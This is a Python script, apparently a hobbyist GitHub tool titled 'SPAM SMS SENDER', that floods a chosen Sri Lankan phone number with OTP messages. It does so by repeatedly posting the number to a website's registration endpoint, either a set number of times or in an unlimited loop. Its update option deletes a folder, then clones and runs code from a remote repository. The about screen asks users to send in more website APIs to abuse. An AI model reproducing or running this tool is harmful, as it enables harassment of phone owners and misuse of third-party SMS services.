#!/bin/python
#CODED BY ISURUWA
#Do not modify codes, it will result  the tool is not working 

from requests import post
import os
import time
import sys


#--- Color  ---#
W  = '\033[0m'  # white (default)
R  = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray

def banner():
    os.system('clear')
    os.system('toilet -f mono12 -F gay "SMS"')
    print("")
    print("\033[1;32m       -----SPAM SMS SENDER-----")
    print("")
    print("\033[31m#CODED BY ISURUWA")

def gurulk(number,delay):
    url='https://guru.lk/auth/headstart/ajax.php'
    data={'phone':number,'action':'sms_reg'}
    poss=post(url,data=data)
    

def back():
    ask()

def update():
    banner()
    os.system('cd')
    os.system('rm -rf SMS')
    os.system('git clone https://github.com/isuruwa/SMS')
    os.system('cd SMS')
    os.system('pip install -r requirements.txt')
    os.system('python sms.py')

def choice():
    banner()
    print("")
    print("\033[1;32m1.Set Count ")
    print("\033[35m2.unlimited ")
    print("\033[1;32m3.Back")
    print("")

    inpp = input("\033[33mEnter your choice : ")
    if inpp == "1":
        sms()
    if inpp == "2":
        unlimited()
    if inpp == "3":
        back()
    if inpp == "":
        choice()


def sent(count,number):
        num = str(number)
        coun = str(count)
        print(' sending OTP ... '+num+'\t'+coun+' Sent Successfully '+'\t'+'\n')
		
def sms():
    banner()
    print("")
    number=input('\033[35mEnter the number : ')
    times=input('\033[34mEnter the count :')
    delay=input('\033[1;32mEnter the delay time : ')
    

    i=0
    time = int(times)
    while i<time:
      gurulk(number,delay)
      i+=1
      sent(i,number)

def unlimited():
    banner()
    print("")
    number=input('\033[35mEnter the number : ')
    delay=input('\033[36mEnter the delay time : ')

    i=0
    while True:
      gurulk(number,delay)
      i+=1
      sent(i,number)

def about():
    os.system('clear')
    banner()
    print("")
    print("")
    print("\033[1;32m1.Support for only Sri Lankan Numbers")
    print("\033[34m2.Still contains only one website Api. More website Apis will be released with future updates."+'\n')
    print("\033[36mSupport me >> Github - https://github.com/isuruwa")
    print("\033[34m          >>Facebook - https://www.facebook.com/isuru.umayanga.37819 ")
    print("")
    print("If you know more web site Apis . send me .")
    print("")
    inp = input("\033[1;32mPress Enter To Continue : ")
    if inp == "":
        ask()

def ask():
    banner()
    print("")
    print("")
    print("\033[34m1.Start Tool")
    print("\033[35m2.Update Tool")
    print("\033[1;32m3.About")
    print("\033[33m4.Exit")
    print("")
    inp=input("\033[36mEnter Your Option  >>> ")
    if inp == "1":
       choice()

    if inp == "2":
       update()

    if inp == "3":
        about()

    if inp == "4":
        print("\033[35mThank You ")
        print("")
        print("CODED BY ISURUWA")
        exit()

    if inp == "":
        ask()


ask()
